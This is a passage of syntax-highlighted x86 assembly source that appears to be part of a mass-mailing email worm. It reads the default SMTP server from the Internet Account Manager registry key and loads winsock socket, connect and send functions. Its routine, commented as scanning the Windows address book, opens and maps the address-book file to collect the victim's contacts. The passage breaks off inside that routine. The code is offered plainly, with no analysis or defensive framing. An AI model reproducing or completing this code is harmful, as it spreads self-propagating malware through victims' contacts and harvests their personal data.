    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">accountnum</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">accountkey</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">lstrcat</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">CloseKeyErr</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hkey</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">KEY_READ</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">accountkey</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hkey</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">RegOpenKeyEx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">ERROR_SUCCESS</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">CloseKeyErr</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SizeOfSMTPServerAdd</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SmtpServerAdd</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">smtp_server</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hkey</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">RegQueryValueEx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">ERROR_SUCCESS</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">CloseKeyErr</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hkey</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">RegCloseKey</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">stc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">CloseKeyErr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hkey</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">RegCloseKey</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">SmtpGetErr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">clc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    
    </span><span class="sc5">smtp_key</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Software\Microsoft\Internet Account Manager"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">default_mail</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Default Mail Account"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">smtp_server</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"SMTP Server"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">SmtpServerAdd</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">75</span><span class="sc0">  </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">SizeOfSMTPServerAdd</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">75</span><span class="sc0">
    </span><span class="sc5">accountnum</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">75</span><span class="sc0">  </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">SizeOfAccountNum</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">75</span><span class="sc0">
    </span><span class="sc5">accountkey</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc13">"Accounts\",75  dup(0)
</span><span class="sc0">    
    
    
</span><span class="sc5">GetWinsockApis</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WinsockDll</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadLibrary</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">GetWinsockApisErr</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hWinsock</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">NumberOfWinsockFunctions</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">winsock_functions_sz</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">winsock_functions_addresses</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_apis</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">GetWinsockApisErr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">clc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    
    </span><span class="sc5">WinsockDll</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"ws2_32.dll"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">hWinsock</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    
    
    </span><span class="sc5">winsock_functions_sz</span><span class="sc4">:</span><span class="sc0">
    
    </span><span class="sc5">_WSAStartup</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"WSAStartup"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_WSACleanup</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"WSACleanup"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_socket</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"socket"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_gethostbyname</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"gethostbyname"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_connect</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"connect"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_recv</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"recv"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_send</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"send"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_htons</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"htons"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_closesocket</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"closesocket"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    
    </span><span class="sc5">winsock_functions_addresses</span><span class="sc4">:</span><span class="sc0">
    
    </span><span class="sc5">WSAStartup</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">WSACleanup</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">socket</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">gethostbyname</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">connect</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">recv</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">send</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">htons</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">closesocket</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    
    </span><span class="sc5">NumberOfWinsockFunctions</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">
    
    
    
    
</span><span class="sc5">ScanWAB</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">;scan the windows address book for email addresses</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hkey</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hkey</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WAB_Location</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">HKEY_CURRENT_USER</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">RegOpenKeyEx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">ERROR_SUCCESS</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">WabScanErr</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SizeOfWAB_PATH</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WAB_Path</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hkey</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">RegQueryValueEx</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;get the wab file location</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">ERROR_SUCCESS</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">CloseWABkeyAndExit</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hkey</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">RegCloseKey</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc1">;open the wab file:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_SHARE_READ</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GENERIC_READ</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WAB_Path</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CreateFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">INVALID_HANDLE_VALUE</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">WabScanErr</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hWabFile</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc1">;map the wab file:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PAGE_READONLY</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hWabFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CreateFileMapping</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">MapWab</span><span class="sc0">
</span><span class="sc5">ErrCMF</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hWabFile</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;error close wab file</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">WabScanErr</span><span class="sc0">
</span><span class="sc5">MapWab</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hWabMap</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_MAP_READ</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hWabMap</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MapViewOfFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ReadAddresses</span><span class="sc0">
</span><span class="sc5">ErrCWM</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hWabMap</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;error close wab map</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ErrCMF</span><span class="sc0">
</span><span class="sc5">ReadAddresses</span><span class="sc4">:</span><span class="sc0">  
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0">  </span><span class="sc5">hWabMapBase</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">64h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;get number of email addresses</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1h</span><span class="sc0">
    </span><span class="sc6">jnbe</span><span class="sc0">    </span><span class="sc5">AllocAddMem</span><span class="sc0">
</span><span class="sc5">ErrUWF</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hWabMapBase</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;error unmap wab file</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">UnMapViewOfFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ErrCWM</span><span class="sc0">  
</span><span class="sc5">AllocAddMem</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NumberOfMailAddresses</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">44h</span><span class="sc0">              </span><span class="sc1">;every mail address allocated 68 bytes</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">              </span><span class="sc1">;ax = size of allocated memory</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GPTR</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GlobalAlloc</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">ErrUWF</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hMailAddresses</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
